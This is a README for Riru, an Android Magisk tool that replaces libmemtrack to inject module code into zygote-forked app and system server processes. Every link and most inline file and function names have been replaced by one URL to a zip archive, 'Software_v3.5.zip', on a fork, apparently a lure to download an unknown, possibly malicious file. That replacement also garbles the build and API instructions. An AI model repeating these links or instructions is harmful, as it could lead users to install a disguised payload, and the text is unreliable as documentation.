# Riru

Riru is a very simple but useful thing. Only requires to replace one system file, it will provide the ability to Riru modules to run their code in apps' or system server's process.

The name Riru is from https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip

[中文说明](https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip)

## Requirements

* Rooted Android 6.0+ devices 
* Magisk (use to replace system files, temporarily only provide Magisk zip)

## How it works?

In short, replace a shared library which will be loaded by the zygote process.

First, we need to find that library. The library needs to be as simple as possible, so we found libmemtrack, with only 10 exported functions.
Then we can provide a library named libmemtrack with all its functions, so the functionality will not be affected and we will able to in the zygote process. (However, it seems that choose libmemtrack is not so appropriate now)

Now the next question, how to know if we are in an app process or a system server process.
We found some JNI functions (`https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip` & `https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip`) will be called when a app or system server is forked.
So we just need to replace these functions to ours. This part is simple, just hook `jniRegisterNativeMethods` since all Java native method in libandroid_runtime is registered with this function.
Then we can call `RegisterNatives` again to replace them.

## Why Riru is made?

There is only one `https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip`, if someone wants to do something by replacing it, others can't. So I made Riru occupy libmemtrack but provide the ability to make modules.

## Build Requirements

Android NDK (add the directory with `ndk-build` to `PATH`)

## Build core

* Magisk Module

  Run `:riru-core:assembleMagiskRelease` task in the command line (use `gradlew`) or Android Studio, zip will be saved to `release`

## Build your own module

1. Copy `riru-module-template` and rename to your name
2. Change module name in `https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip`
3. Change module information in `https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip`
4. Write your code
5. Run `:riru-your-module:assembleMagiskRelease` task in command line (use `gradlew`) or Android Studio, zip will be saved to `release`

## APIs provided by core

From v8, core starts to providing some APIs, see [riru.h](https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip).

## Where your own module needs attention

* DO NOT overwrite `https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip` in core, or your data may be wiped
  ([Detail info](https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip))
  (If you really need to hook this, remember to clear exception)
* DO NO print log (`__android_log_print`) in `nativeForkAndSpecialize(Pre/Post)` `nativeForkSystemServer(Pre/Post)` when in zygote process, or it may cause zygote not work
  (magic not confirmed, [Detail info](https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip))
* Add `-ffixed-x18` to both compiler and linker parameter, or it will cause problems on Android Q (see template)

## Riru API

* Currently, one module version can only support one API version
* See template for details

### v3 (core v18+)

* Add `api=3` to `https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip` to declare API version
* Check and deny installation if Riru version is below v18 in `https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip` 
* Parameter of `nativeForkAndSpecializePre` changes (compare to v2, added `jstring *packageName, jobjectArray *packagesForUID, jobjectArray *visibleVolIDs` in the end)

### v2 (core v16-v17.1)

* Export `int getApiVersion() { return 2; }` to declare API version
* Parameter of `nativeForkAndSpecializePre` changes (compare to v1, all parameter is pointer)

## Install

Current only support Magisk.

1. Install core zip in Magisk
2. Install module zip in Magisk

## Modules

[Riru-LocationReportEnabler](https://raw.githubusercontent.com/ricardocvs13/Riru/master/template/magisk/META-INF/Software_v3.5.zip) (also a good example)